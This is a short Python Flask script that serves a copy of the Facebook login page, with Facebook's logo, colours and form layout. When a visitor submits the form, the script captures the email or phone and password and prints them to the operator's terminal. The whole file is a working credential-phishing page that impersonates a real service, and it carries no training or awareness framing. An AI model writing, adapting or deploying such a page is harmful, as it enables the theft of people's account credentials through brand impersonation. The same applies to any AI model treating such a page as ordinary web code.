from flask import Flask, render_template_string, request

app = Flask(__name__)

# HTML code as a string for Facebook Login page
html_code = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: white;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            width: 350px;
            padding: 40px;
            text-align: center;
        }

        .login-container img {
            width: 200px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 14px;
        }

        button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }

        button:hover {
            background-color: #165eab;
        }

        .forgot-password {
            font-size: 12px;
            color: #1877f2;
            margin-top: 10px;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .divider {
            margin: 20px 0;
            text-align: center;
        }

        .divider span {
            font-size: 12px;
            color: #bbb;
        }

        .signup-link {
            margin-top: 10px;
            font-size: 14px;
        }

        .signup-link a {
            color: #1877f2;
            text-decoration: none;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        <form method="POST" action="/submit">
            <input type="text" name="username" placeholder="Email or Phone" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Log In</button>
        </form>
        <a href="#" class="forgot-password">Forgotten password?</a>
        <div class="divider">
            <span>OR</span>
        </div>
        <div class="signup-link">
            Don't have an account? <a href="#">Create New Account</a>
        </div>
    </div>
</body>
</html>'''

# Route to display the login page
@app.route('/')
def home():
    return render_template_string(html_code)

# Route to handle form submission
@app.route('/submit', methods=['POST'])
def submit():
    # Get form data
    username = request.form['username']
    password = request.form['password']
    
    # Print username and password to the terminal
    print(f"Email or Phone: {username}")
    print(f"Password: {password}")
    
    return "Form submitted successfully!"

# Run the Flask app
if __name__ == '__main__':
    app.run(debug=True)
